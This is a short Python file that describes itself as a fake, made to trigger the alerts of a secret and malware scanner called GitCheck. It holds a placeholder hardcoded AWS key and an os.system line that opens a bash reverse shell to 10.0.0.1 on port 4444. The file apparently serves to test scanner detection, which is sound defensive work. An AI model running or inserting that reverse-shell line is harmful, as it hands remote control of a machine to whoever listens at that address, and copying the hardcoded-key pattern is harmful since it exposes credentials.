# A fake file to trigger the GitCheck scanners

# 1. Hardcoded Secret
AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'

# 2. Malicious Command
import os
os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
